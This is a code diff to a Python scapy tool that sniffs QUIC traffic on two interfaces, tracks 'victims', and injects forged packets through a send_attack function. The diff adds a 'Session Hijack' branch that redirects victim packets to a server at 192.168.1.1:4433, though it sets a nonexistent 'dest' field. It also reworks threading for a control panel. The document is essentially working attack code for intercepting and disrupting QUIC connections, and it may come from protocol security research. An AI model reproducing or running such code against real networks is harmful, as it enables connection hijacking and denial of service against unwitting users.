@@ -1,4 +1,4 @@
-import os
+import os, signal
 import argparse
 
 from scapy.all import *
@@ -10,10 +10,10 @@ bind_bottom_up(UDP, QUIC, dport=443)
 bind_layers(UDP, QUIC, dport=443, sport=443)
 
 from forge import forge_cc_scapy
-import threading, sys, os
+import threading, sys, os, multiprocessing
 from victims import Victims
 from quic_protected import *
-
+from test_server.server import main
 
 
 
@@ -86,6 +86,8 @@ def send_attack(victim, PacketNumberLen):
 
 def handle_quic(pkt):
     global vs
+    if vs.exit:
+        raise StopIteration # This will stop the sniff() function
     # Only process if this packet has a QUIC Initial header
     if pkt.haslayer(UDP) and pkt.getlayer(Ether).src != get_if_hwaddr(inner_iface) and pkt.getlayer(Ether).src != get_if_hwaddr(outer_iface):
         if pkt.sniffed_on == inner_iface:
@@ -96,7 +98,16 @@ def handle_quic(pkt):
                     #send_attack2(pkt,ver="V1")
                     send_attack(pkt, PacketNumberLen = pkt[QUIC_Initial].PacketNumberLen)
                     return
-                
+                elif (vs[pkt[IP].src].status["Session Hijack"] or vs[pkt[IP].src][pkt[IP].dst]["Session Hijack"]):
+                    new_pkt = pkt[IP]
+                    new_pkt[IP].dest = "192.168.1.1"
+                    new_pkt[UDP].dport = 4433
+                    del new_pkt.getlayer(IP).chksum
+                    del new_pkt.getlayer(UDP).chksum
+                    #print(f"New PKT to server: {new_pkt.summary()}")
+                    send(new_pkt, iface=inner_iface, verbose=False)
+                    print("Sent shit")
+                    return
             add_and_send_to_server(pkt)
             
             
@@ -141,10 +152,23 @@ if __name__ == "__main__":
     outer_iface = args.outer_iface
     vs = Victims()
     #print(f"Inner_iface: {inner_iface} , Outer_iface: {outer_iface}")      
-    threading.Thread(target=vs.run, daemon=True).start()
-    # Sniff UDP 443 traffic and invoke handle_quic for each packet
-    sniff(
-        iface=[inner_iface, outer_iface],
-        prn=handle_quic,         # callback for every packet
-        store=False                  # don’t keep packets in memory
-    )
+    control_panel_thread = threading.Thread(target=vs.run)
+    control_panel_thread.start()
+    if isinstance(threading.current_thread(), threading._MainThread):
+        """p = multiprocessing.Process(target=main,
+            args=("0.0.0.0",4433, "./test/ssl_cert.pem", "./test/ssl_key.pem", "./test_server/index.html"), daemon=True)
+        p.start()"""
+        if multiprocessing.parent_process() is None:
+            # Sniff UDP 443 traffic and invoke handle_quic for each packet
+            sniff(
+                iface=[inner_iface, outer_iface],
+                prn=handle_quic,         # callback for every packet
+                store=False                  # don’t keep packets in memory
+            )
+            """p.terminate()
+            if p.is_alive():       # very rare, but just in case on Unix:
+                os.kill(p.pid, signal.SIGKILL)  # Unix-only sledgehammer
+                p.join()"""
+            control_panel_thread.join()
+
+        
